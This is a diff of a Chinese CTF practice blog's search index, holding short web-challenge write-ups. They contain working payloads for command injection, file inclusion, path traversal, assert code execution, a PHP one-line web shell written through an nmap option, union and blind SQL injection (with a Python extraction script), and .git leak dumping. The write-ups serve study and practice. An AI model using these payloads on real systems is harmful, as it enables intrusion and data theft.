@@ -1,64 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>20210516</title>
-    <url>/posts/436545a/</url>
-    <content><![CDATA[<h2 id="BUUCTF-ACTF2020-新生赛-Exec"><a href="#BUUCTF-ACTF2020-新生赛-Exec" class="headerlink" title="BUUCTF[ACTF2020 新生赛]Exec"></a>BUUCTF[ACTF2020 新生赛]Exec</h2><blockquote>
-<p>something wrong so I must use English</p>
-</blockquote>
-<p>command execustion and some strange sign</p>
-<p>just need to ping 127.0.0.1 and we can see that it is ok to connect and then we need use the pipe sign to ping like this</p>
-<pre><code>127.0.0.1 | cat /flag
-</code></pre>
-<p>| is a sign that just do the thing behind</p>
-<p>|| if the first iswrong then do the second</p>
-<p>&amp; is do both the two don’need right</p>
-<p>&amp;&amp; is A-&gt;B A must right then B will be done</p>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>20210515</title>
-    <url>/posts/9d3f05e0/</url>
-    <content><![CDATA[<h2 id="BUUCTF-极客大挑战-2019-Secret-File"><a href="#BUUCTF-极客大挑战-2019-Secret-File" class="headerlink" title="BUUCTF[极客大挑战 2019]Secret File"></a>BUUCTF[极客大挑战 2019]Secret File</h2><blockquote>
-<p>主要就是文件包含和php伪协议</p>
-</blockquote>
-<p>首先观察网页，一团黑，几个字，F12，发现有个标签跟背景色一样，提示有个Archive_room.php，进去有个按钮一按就跳到了end.php，审查元素有个action.php,用bp抓包</p>
-<pre><code>&lt;html&gt;
-    &lt;!--
-    secr3t.php        
-    --&gt;
-&lt;/html&gt;
-</code></pre>
-<p>提示secr3t.php，进去是php代码，看一圈，经典文件包含</p>
-<p>构造payload:</p>
-<pre><code>?file=php://filter/read=convert.base64-encode/resource=flag.php
-</code></pre>
-<p>base64解码得到flag{66971634-57d7-4de8-a9f2-389057aa5e42}</p>
-<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><blockquote>
-<p>代码审计</p>
-</blockquote>
-<p>F12,提示source.php,打开代码审计</p>
-<p>payload:</p>
-<pre><code>file=hint.php?/../../../../../ffffllllaaaagggg
-</code></pre>
-<p>一顿绕过之后，hint.php?/被当成目录，向上跳目录</p>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>20210518</title>
     <url>/posts/e38e795d/</url>
     <content><![CDATA[<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><blockquote>
@@ -120,110 +62,67 @@ EXECUTE name;  //执行预定义SQL语句
         <category>ctf每日一题</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
         <tag>sql注入</tag>
       </tags>
   </entry>
   <entry>
-    <title>20210522</title>
-    <url>/posts/2876c380/</url>
-    <content><![CDATA[<h2 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h2><pre><code>127.0.0.1 | find / -name flag #一种查找方法
-</code></pre>
-<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><blockquote>
-<p>http协议</p>
+    <title>20210516</title>
+    <url>/posts/436545a/</url>
+    <content><![CDATA[<h2 id="BUUCTF-ACTF2020-新生赛-Exec"><a href="#BUUCTF-ACTF2020-新生赛-Exec" class="headerlink" title="BUUCTF[ACTF2020 新生赛]Exec"></a>BUUCTF[ACTF2020 新生赛]Exec</h2><blockquote>
+<p>something wrong so I must use English</p>
 </blockquote>
-<p>改代理</p>
-<pre><code>Referer:https://www.Sycsecret.com
+<p>command execustion and some strange sign</p>
+<p>just need to ping 127.0.0.1 and we can see that it is ok to connect and then we need use the pipe sign to ping like this</p>
+<pre><code>127.0.0.1 | cat /flag
 </code></pre>
-<p>改浏览器</p>
-<pre><code>User-Agent:Syclover
-</code></pre>
-<p>简单XFF</p>
-<pre><code>X-Forwarded-For:127.0.0.1
-</code></pre>
-<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><blockquote>
-<p>sql注入</p>
-</blockquote>
-<p>扫根目录</p>
-<pre><code>? num=1;var_dump(scandir(chr(47)))
-</code></pre>
-<p>flag文件内容</p>
-<pre><code>? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
-</code></pre>
-<p>假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>
-<p> PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符  2.将某些字符转换为下划线</p>
-<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><blockquote>
-<p>文件上传</p>
-</blockquote>
-<p><a href="https://www.cnblogs.com/wangtanzhi/p/12243206.html">https://www.cnblogs.com/wangtanzhi/p/12243206.html</a></p>
+<p>| is a sign that just do the thing behind</p>
+<p>|| if the first iswrong then do the second</p>
+<p>&amp; is do both the two don’need right</p>
+<p>&amp;&amp; is A-&gt;B A must right then B will be done</p>
 ]]></content>
       <categories>
         <category>ctf每日一题</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
-        <tag>sql注入</tag>
-        <tag>文件上传</tag>
+        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
-    <title>20210524</title>
-    <url>/posts/c11566b5/</url>
-    <content><![CDATA[<h2 id="flag藏在变量里"><a href="#flag藏在变量里" class="headerlink" title="flag藏在变量里"></a>flag藏在变量里</h2><p>神奇的GLOBALS打印出全部变量<br>    /?args=GLOBALS</p>
-<h2 id="dirsearch使用"><a href="#dirsearch使用" class="headerlink" title="dirsearch使用"></a>dirsearch使用</h2><p>-u  指定网址</p>
-<p>-e   指定网站语言</p>
-<p>-w   指定字典</p>
-<p>-r    递归目录（跑出目录后，继续跑目录下面的目录）</p>
-<p>-random-agents  使用随机UA</p>
-<h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><pre><code>python dirsearch.py -u 网址 -e php 或 python .\dirsearch.py -u 网址 -e php
+    <title>20210515</title>
+    <url>/posts/9d3f05e0/</url>
+    <content><![CDATA[<h2 id="BUUCTF-极客大挑战-2019-Secret-File"><a href="#BUUCTF-极客大挑战-2019-Secret-File" class="headerlink" title="BUUCTF[极客大挑战 2019]Secret File"></a>BUUCTF[极客大挑战 2019]Secret File</h2><blockquote>
+<p>主要就是文件包含和php伪协议</p>
+</blockquote>
+<p>首先观察网页，一团黑，几个字，F12，发现有个标签跟背景色一样，提示有个Archive_room.php，进去有个按钮一按就跳到了end.php，审查元素有个action.php,用bp抓包</p>
+<pre><code>&lt;html&gt;
+    &lt;!--
+    secr3t.php        
+    --&gt;
+&lt;/html&gt;
 </code></pre>
-<h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p>先用dirsearch扫目录，找到index.php.bak，代码审计。</p>
-<pre><code>&lt;?php
-/**
-* Created by PhpStorm.
-* User: Norse
-* Date: 2017/8/6
-* Time: 20:22
-*/
-include_once &quot;flag.php&quot;;
-ini_set(&quot;display_errors&quot;, 0);
-$str = strstr($_SERVER[&#39;REQUEST_URI&#39;], &#39;?&#39;); 
-$str = substr($str,1);              #字符串截取
-$str = str_replace(&#39;key&#39;,&#39;&#39;,$str);  #字符串替换
-parse_str($str);                    #解析字符串为变量
-echo md5($key1);
-
-echo md5($key2);
-if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;
-    echo $flag.&quot;取得flag&quot;;
-&#125;
-?&gt;
+<p>提示secr3t.php，进去是php代码，看一圈，经典文件包含</p>
+<p>构造payload:</p>
+<pre><code>?file=php://filter/read=convert.base64-encode/resource=flag.php
 </code></pre>
-<p>利用MD5不处理数组的特性，构造两个key</p>
-<pre><code>payload: http://114.67.246.176:19217/index.php?kkeyey1[]=1&amp;kkeyey2[]=2
+<p>base64解码得到flag{66971634-57d7-4de8-a9f2-389057aa5e42}</p>
+<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><blockquote>
+<p>代码审计</p>
+</blockquote>
+<p>F12,提示source.php,打开代码审计</p>
+<p>payload:</p>
+<pre><code>file=hint.php?/../../../../../ffffllllaaaagggg
 </code></pre>
-<h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><p>姿势：</p>
-<pre><code>id=0&#39; union select 1,2,3,4#
-查数据库
-id=0&#39; union select 1,2,3,database()#
-查表
-id=0&#39; union select 1,2,3,table_name from information_schema.tables where table_schema=&#39;库名&#39;# 
-查列
-id=0&#39; union select 1,2,3,column_name from information_schema.columns where table_name=&#39;表名&#39;#
-查值
-id=0&#39; union select 1,2,3,列名 from 表名#
-</code></pre>
+<p>一顿绕过之后，hint.php?/被当成目录，向上跳目录</p>
 ]]></content>
       <categories>
         <category>ctf每日一题</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
-        <tag>sql注入</tag>
-        <tag>代码审计</tag>
+        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
@@ -288,8 +187,109 @@ id=0&#39; union select 1,2,3,列名 from 表名#
         <category>ctf每日一题</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20210522</title>
+    <url>/posts/2876c380/</url>
+    <content><![CDATA[<h2 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h2><pre><code>127.0.0.1 | find / -name flag #一种查找方法
+</code></pre>
+<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><blockquote>
+<p>http协议</p>
+</blockquote>
+<p>改代理</p>
+<pre><code>Referer:https://www.Sycsecret.com
+</code></pre>
+<p>改浏览器</p>
+<pre><code>User-Agent:Syclover
+</code></pre>
+<p>简单XFF</p>
+<pre><code>X-Forwarded-For:127.0.0.1
+</code></pre>
+<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><blockquote>
+<p>sql注入</p>
+</blockquote>
+<p>扫根目录</p>
+<pre><code>? num=1;var_dump(scandir(chr(47)))
+</code></pre>
+<p>flag文件内容</p>
+<pre><code>? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
+</code></pre>
+<p>假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>
+<p> PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符  2.将某些字符转换为下划线</p>
+<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><blockquote>
+<p>文件上传</p>
+</blockquote>
+<p><a href="https://www.cnblogs.com/wangtanzhi/p/12243206.html">https://www.cnblogs.com/wangtanzhi/p/12243206.html</a></p>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>ctf</tag>
+        <tag>sql注入</tag>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20210524</title>
+    <url>/posts/c11566b5/</url>
+    <content><![CDATA[<h2 id="flag藏在变量里"><a href="#flag藏在变量里" class="headerlink" title="flag藏在变量里"></a>flag藏在变量里</h2><p>神奇的GLOBALS打印出全部变量<br>    /?args=GLOBALS</p>
+<h2 id="dirsearch使用"><a href="#dirsearch使用" class="headerlink" title="dirsearch使用"></a>dirsearch使用</h2><p>-u  指定网址</p>
+<p>-e   指定网站语言</p>
+<p>-w   指定字典</p>
+<p>-r    递归目录（跑出目录后，继续跑目录下面的目录）</p>
+<p>-random-agents  使用随机UA</p>
+<h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><pre><code>python dirsearch.py -u 网址 -e php 或 python .\dirsearch.py -u 网址 -e php
+</code></pre>
+<h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p>先用dirsearch扫目录，找到index.php.bak，代码审计。</p>
+<pre><code>&lt;?php
+/**
+* Created by PhpStorm.
+* User: Norse
+* Date: 2017/8/6
+* Time: 20:22
+*/
+include_once &quot;flag.php&quot;;
+ini_set(&quot;display_errors&quot;, 0);
+$str = strstr($_SERVER[&#39;REQUEST_URI&#39;], &#39;?&#39;); 
+$str = substr($str,1);              #字符串截取
+$str = str_replace(&#39;key&#39;,&#39;&#39;,$str);  #字符串替换
+parse_str($str);                    #解析字符串为变量
+echo md5($key1);
+
+echo md5($key2);
+if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;
+    echo $flag.&quot;取得flag&quot;;
+&#125;
+?&gt;
+</code></pre>
+<p>利用MD5不处理数组的特性，构造两个key</p>
+<pre><code>payload: http://114.67.246.176:19217/index.php?kkeyey1[]=1&amp;kkeyey2[]=2
+</code></pre>
+<h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><p>姿势：</p>
+<pre><code>id=0&#39; union select 1,2,3,4#
+查数据库
+id=0&#39; union select 1,2,3,database()#
+查表
+id=0&#39; union select 1,2,3,table_name from information_schema.tables where table_schema=&#39;库名&#39;# 
+查列
+id=0&#39; union select 1,2,3,column_name from information_schema.columns where table_name=&#39;表名&#39;#
+查值
+id=0&#39; union select 1,2,3,列名 from 表名#
+</code></pre>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>ctf</tag>
+        <tag>sql注入</tag>
+        <tag>代码审计</tag>
       </tags>
   </entry>
   <entry>
@@ -376,8 +376,8 @@ findFile(path)
         <category>ctf每日一题</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
         <tag>sql注入</tag>
         <tag>misc</tag>
       </tags>
@@ -455,8 +455,8 @@ findFile(path)
         <category>ctf每日一题</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
@@ -478,8 +478,8 @@ findFile(path)
         <category>ctf每日一题</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
         <tag>代码审计</tag>
       </tags>
   </entry>
@@ -569,8 +569,8 @@ Submit
         <category>ctf每日一题</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
         <tag>文件上传</tag>
         <tag>反序列化</tag>
       </tags>
@@ -591,8 +591,8 @@ Submit
         <category>ctf每日一题</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
         <tag>文件上传</tag>
       </tags>
   </entry>
@@ -626,8 +626,8 @@ Submit
         <category>ctf学习</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
@@ -691,32 +691,9 @@ Submit
         <category>ctf每日一题</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
         <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>20210901</title>
-    <url>/posts/8a5309dc/</url>
-    <content><![CDATA[<h1 id="mfs"><a href="#mfs" class="headerlink" title="mfs"></a>mfs</h1><blockquote>
-<p>git泄露，代码审计，assert命令执行</p>
-</blockquote>
-<pre><code>pyload: ?page=abc&#39;) or system(&quot;tac templates/flag.php&quot;);//
-</code></pre>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<pre><code>python2 GitHack.py http://114.67.246.176:10015/.git/
-</code></pre>
-<p>先用githack,爬取.git,发现存在flag.php,利用assert代码执行，先用’)将strops闭合，<br>然后执行后面的</p>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>rce</tag>
       </tags>
   </entry>
   <entry>
@@ -753,9 +730,50 @@ Submit
         <category>ctf每日一题</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
         <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20210901</title>
+    <url>/posts/8a5309dc/</url>
+    <content><![CDATA[<h1 id="mfs"><a href="#mfs" class="headerlink" title="mfs"></a>mfs</h1><blockquote>
+<p>git泄露，代码审计，assert命令执行</p>
+</blockquote>
+<pre><code>pyload: ?page=abc&#39;) or system(&quot;tac templates/flag.php&quot;);//
+</code></pre>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<pre><code>python2 GitHack.py http://114.67.246.176:10015/.git/
+</code></pre>
+<p>先用githack,爬取.git,发现存在flag.php,利用assert代码执行，先用’)将strops闭合，<br>然后执行后面的</p>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>ctf</tag>
+        <tag>rce</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20210907</title>
+    <url>/posts/6330ace9/</url>
+    <content><![CDATA[<h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><p>利用了namp一个参数，将一句话写入文件，rce</p>
+<p>同时escapeshellarg()和escapeshellcmd()同时出现会有bug</p>
+<pre><code>pyload:?host=&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php&#39;
+</code></pre>
+<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>ctf</tag>
+        <tag>rce</tag>
+        <tag>命令执行</tag>
       </tags>
   </entry>
   <entry>
@@ -812,8 +830,8 @@ Submit
         <category>ctf每日一题</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
         <tag>sql注入</tag>
         <tag>文件上传</tag>
         <tag>代码审计</tag>
@@ -846,28 +864,53 @@ Submit
         <category>ctf每日一题</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
         <tag>反序列化</tag>
         <tag>SSTI</tag>
       </tags>
   </entry>
   <entry>
-    <title>20210907</title>
-    <url>/posts/6330ace9/</url>
-    <content><![CDATA[<h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><p>利用了namp一个参数，将一句话写入文件，rce</p>
-<p>同时escapeshellarg()和escapeshellcmd()同时出现会有bug</p>
-<pre><code>pyload:?host=&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php&#39;
+    <title>20210926</title>
+    <url>/posts/2601fefd/</url>
+    <content><![CDATA[<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>先贴一篇文章，讲的比较好，关于mysql注入的</p>
+<p><a href="https://www.anquanke.com/post/id/85936">https://www.anquanke.com/post/id/85936</a></p>
+<p>这个题呢，最终就是直接跑脚本</p>
+<p>测试1，2会返回两个语句，测试2-1返回1的语句，是数字型注入，然后union发现有waf,fuzz获取过滤的字段，这里学会了怎么用bp进行fuzz，以及fuzzdb这个仓库</p>
+<p>正确的方法是先利用if语句，实现布尔注入。利用括号来绕过空格的过滤。经过测试，用TAB或者%09%0a%0d之类这样的绕过方式也可以成功绕过空格。</p>
+<p>sql的三目运算</p>
+<pre><code>if( 表达式1，表达式2，表达式3)
 </code></pre>
-<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
+<p>如果表达式1是正确的，那么执行表达式2，否则执行表达式3</p>
+<p>或者异或注入</p>
+<pre><code>0^(ascii(substr((select(flag)from(flag)),1,1))&gt;1)
+</code></pre>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://4cf19355-75e2-47ba-b522-4ed93121403f.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;http://4cf19355-75e2-47ba-b522-4ed93121403f.node4.buuoj.cn:81&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://4cf19355-75e2-47ba-b522-4ed93121403f.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.session()</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&#x27;-&#123;abcdefghijklmnopqrstuvwxyz0123456789&#125;&#x27;</span>:</span><br><span class="line">        sqls = <span class="string">f&quot;if(ascii(substr((select(flag)from(flag)),<span class="subst">&#123;i&#125;</span>,1))=ascii(&#x27;<span class="subst">&#123;j&#125;</span>&#x27;),1,2)&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: sqls</span><br><span class="line">        &#125;</span><br><span class="line">        res = r.post(url=url, data=data, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hello&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>看到<a href="https://blog.csdn.net/rfrder/article/details/109263584">https://blog.csdn.net/rfrder/article/details/109263584</a>这个大佬想到了stripos的漏洞</p>
+<blockquote>
+<p>这时候想到stripos函数的一个漏洞。如果没有找到的话返回的是false，如果找到了但是是在字符串的首位，返回的是0。如果后端用了弱类型比较的话，0==false，这样后面就可以使用被过滤的某一个字符串了</p>
+</blockquote>
+<p>进行尝试，</p>
+<p>首先id=1union：</p>
+<p>SQL Injection Checked.</p>
+<p>再试试id=union1union：</p>
+<p>bool(false)</p>
+<p>如果这个题目把括号,tab,以及各种可以充当空格的都给过滤了的话，就用这种方法来绕过空格的过滤。</p>
+<p>不过不知道为啥，每次跑出的flag都不一样，呃呃呃，然后都不能过。。。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;d9a6fbce43f97d2164f1b3e&#125;</span><br><span class="line">flag&#123;d95e7a6fc1e43f7d164f414b&#125;</span><br><span class="line">flag&#123;d9e7a6fc1e43f7d214f41b3e&#125;</span><br><span class="line">flag&#123;d956fce443f9f57d14f414b&#125;</span><br></pre></td></tr></table></figure>
+
+<p>原来是’-‘被过滤了，测试到-的时候会返回sql注入</p>
+<p>服务器出了点小意外，不能push了，cpu给爆了，不知道为啥。。</p>
+<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210927012625.png"></p>
+]]></content>
       <categories>
         <category>ctf每日一题</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
-        <tag>rce</tag>
-        <tag>命令执行</tag>
+        <tag>ctf</tag>
+        <tag>sql注入</tag>
+        <tag>测试工具</tag>
       </tags>
   </entry>
   <entry>
@@ -908,53 +951,32 @@ Submit
         <category>ctf每日一题</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
         <tag>代码审计</tag>
         <tag>文件包含</tag>
       </tags>
   </entry>
   <entry>
-    <title>20210926</title>
-    <url>/posts/2601fefd/</url>
-    <content><![CDATA[<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>先贴一篇文章，讲的比较好，关于mysql注入的</p>
-<p><a href="https://www.anquanke.com/post/id/85936">https://www.anquanke.com/post/id/85936</a></p>
-<p>这个题呢，最终就是直接跑脚本</p>
-<p>测试1，2会返回两个语句，测试2-1返回1的语句，是数字型注入，然后union发现有waf,fuzz获取过滤的字段，这里学会了怎么用bp进行fuzz，以及fuzzdb这个仓库</p>
-<p>正确的方法是先利用if语句，实现布尔注入。利用括号来绕过空格的过滤。经过测试，用TAB或者%09%0a%0d之类这样的绕过方式也可以成功绕过空格。</p>
-<p>sql的三目运算</p>
-<pre><code>if( 表达式1，表达式2，表达式3)
-</code></pre>
-<p>如果表达式1是正确的，那么执行表达式2，否则执行表达式3</p>
-<p>或者异或注入</p>
-<pre><code>0^(ascii(substr((select(flag)from(flag)),1,1))&gt;1)
-</code></pre>
